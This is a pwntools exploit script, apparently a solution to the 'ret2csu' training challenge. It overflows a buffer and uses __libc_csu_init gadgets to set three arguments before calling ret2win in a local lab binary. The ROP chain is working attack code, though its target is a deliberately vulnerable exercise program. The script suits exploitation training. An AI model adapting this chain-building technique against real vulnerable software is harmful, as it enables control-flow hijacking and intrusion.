from pwn import *

context.arch = "amd64"
elf = ELF("ret2csu")
rop = ROP(elf)

offset = 40
# Arguments required when calling ret2win-function
arg_1 = 0xdeadbeefdeadbeef
arg_2 = 0xcafebabecafebabe
arg_3 = 0xd00df00dd00df00d

mov_args_to_registers = 0x400680    # mov rdx,r15 / mov rsi,r14 / mov edi,r13d / ...
pop_registers = 0x40069a            # rbx, rbp, r12, r13, r14, r15
ret2win = elf.plt.ret2win           # ret2win function-address
r12_value = 0x600e30                # Address to _DYNAMIC where it will eventually return

payload = b'A' * offset
payload += p64(pop_registers)
payload += p64(1) + p64(2) + p64(r12_value)       # Set rbx/rbp to 1/2 to bypass cmp-check (and not get RIP = 0xc)
payload += p64(arg_1) + p64(arg_2)+ p64(arg_3)    # Set register vals (arg_1 will be read half of)
payload += p64(mov_args_to_registers)
payload += p64(0) * 7                             # Filling up registers with junk
payload += p64(rop.rdi.address)
payload += p64(arg_1)                             # Populate the register again with the arg
payload += p64(ret2win)

p = elf.process()
p.recvuntil(b"> ")
p.sendline(payload)
print(p.recvall().decode())
